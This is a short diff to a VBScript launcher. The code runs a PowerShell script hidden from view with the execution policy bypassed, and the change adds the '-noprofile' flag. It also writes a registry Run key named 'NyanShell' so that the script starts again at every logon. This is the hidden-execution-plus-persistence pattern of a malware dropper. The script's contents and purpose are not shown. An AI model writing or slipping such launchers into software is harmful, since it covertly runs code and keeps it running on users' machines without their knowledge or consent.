@@ -20,7 +20,7 @@ WScript.Sleep 1000
 Set ps1 = CreateObject("Scripting.FileSystemObject")
 If ps1.FileExists(scriptShell) Then
 Set objShell = CreateObject("Wscript.shell")
-objShell.run("powershell -executionpolicy bypass -windowstyle hidden -noexit -file " + scriptShell)
+objShell.run("powershell -executionpolicy bypass -noprofile -windowstyle hidden -noexit -file " + scriptShell)
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\NyanShell","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden -noexit -file " + scriptShell,"REG_SZ"
 End If
